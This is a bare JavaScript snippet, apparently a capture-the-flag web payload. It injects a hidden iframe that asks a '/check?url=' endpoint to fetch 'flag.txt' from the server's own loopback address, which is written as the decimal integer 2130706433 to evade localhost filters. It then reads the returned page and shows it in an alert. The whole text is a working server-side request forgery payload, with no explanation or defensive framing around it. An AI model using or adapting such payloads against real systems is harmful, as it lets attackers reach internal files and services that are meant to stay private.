var iframe = document.createElement('iframe');
iframe.style.display = 'none';
iframe.src = '/check?url=' + encodeURIComponent('http://2130706433/flag.txt');
iframe.onload = function() {
  try {
    var content = iframe.contentDocument.body.innerText;
    alert(content);
  } catch(e) {
    alert('Error: ' + e);
  }
};
document.body.appendChild(iframe);